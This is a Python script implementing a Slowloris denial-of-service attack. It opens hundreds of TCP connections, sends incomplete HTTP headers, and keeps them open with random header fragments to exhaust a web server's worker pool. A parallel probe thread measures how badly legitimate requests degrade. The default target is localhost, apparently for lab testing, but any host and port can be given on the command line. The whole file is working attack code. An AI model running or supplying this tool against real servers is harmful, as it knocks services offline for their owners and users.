"""
Slowloris Attack (Layer 7 — connection exhaustion)
Opens many TCP connections, sends partial HTTP headers very slowly.
The server keeps those connections open, exhausting its worker pool
so legitimate requests can no longer be served.

Requires no special privileges (pure TCP sockets).
"""

import socket
import time
import threading
import random
import string
from dataclasses import dataclass, field
from typing import List


@dataclass
class SlowlorisResult:
    sockets_opened: int = 0
    sockets_failed: int = 0
    keep_alive_sends: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    # Latency samples taken by a parallel legitimate-client probe
    probe_latencies: List[float] = field(default_factory=list)
    probe_failures: int = 0

    @property
    def duration(self) -> float:
        return self.end_time - self.start_time


def _make_socket(host: str, port: int) -> socket.socket | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        # Send a partial HTTP request: never the final \r\n\r\n
        s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
        return s
    except Exception:
        return None


def _keep_alive_loop(
    host: str,
    port: int,
    sockets: list,
    lock: threading.Lock,
    result: "SlowlorisResult",
    stop_event: threading.Event,
    interval: float = 10.0,
):
    """Periodically sends a header fragment to keep connections alive."""
    while not stop_event.is_set():
        time.sleep(interval)
        dead = []
        with lock:
            for s in sockets:
                try:
                    # Send a random incomplete header line
                    header = f"X-{_random_str(6)}: {_random_str(8)}\r\n"
                    s.send(header.encode())
                    result.keep_alive_sends += 1
                except Exception:
                    dead.append(s)
            for s in dead:
                sockets.remove(s)
                # Try to replace the closed socket
                new_s = _make_socket(host, port)
                if new_s:
                    sockets.append(new_s)


def _probe_loop(
    host: str,
    port: int,
    result: "SlowlorisResult",
    lock: threading.Lock,
    stop_event: threading.Event,
):
    """Sends legitimate HTTP requests to measure degradation over time."""
    import requests as req_lib
    url = f"http://{host}:{port}/"
    session = req_lib.Session()
    while not stop_event.is_set():
        try:
            t0 = time.perf_counter()
            session.get(url, timeout=5)
            latency = time.perf_counter() - t0
            with lock:
                result.probe_latencies.append(latency)
        except Exception:
            with lock:
                result.probe_failures += 1
        time.sleep(0.5)


def _random_str(n: int) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def run(host: str, port: int = 5000, num_sockets: int = 200, duration: float = 30.0) -> SlowlorisResult:
    result = SlowlorisResult()
    lock = threading.Lock()
    stop_event = threading.Event()
    sockets = []

    result.start_time = time.time()

    # Open initial pool of slow connections
    print(f"  Opening {num_sockets} slow connections...")
    for _ in range(num_sockets):
        s = _make_socket(host, port)
        if s:
            sockets.append(s)
            result.sockets_opened += 1
        else:
            result.sockets_failed += 1

    print(f"  {result.sockets_opened} sockets opened, {result.sockets_failed} failed")

    # Keep-alive thread
    ka_thread = threading.Thread(
        target=_keep_alive_loop,
        args=(host, port, sockets, lock, result, stop_event),
        daemon=True,
    )
    ka_thread.start()

    # Probe thread (measures legitimate-client experience)
    probe_thread = threading.Thread(
        target=_probe_loop,
        args=(host, port, result, lock, stop_event),
        daemon=True,
    )
    probe_thread.start()

    time.sleep(duration)
    stop_event.set()
    result.end_time = time.time()

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return result


if __name__ == "__main__":
    import sys

    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    num_sockets = int(sys.argv[3]) if len(sys.argv) > 3 else 200
    dur = float(sys.argv[4]) if len(sys.argv) > 4 else 30.0

    print(f"Slowloris → {host}:{port}  sockets={num_sockets}  duration={dur}s")
    r = run(host, port, num_sockets, dur)
    print(f"  Sockets opened     : {r.sockets_opened}")
    print(f"  Keep-alive sends   : {r.keep_alive_sends}")
    if r.probe_latencies:
        avg = sum(r.probe_latencies) / len(r.probe_latencies)
        print(f"  Probe avg latency  : {avg*1000:.1f} ms")
    print(f"  Probe failures     : {r.probe_failures}")
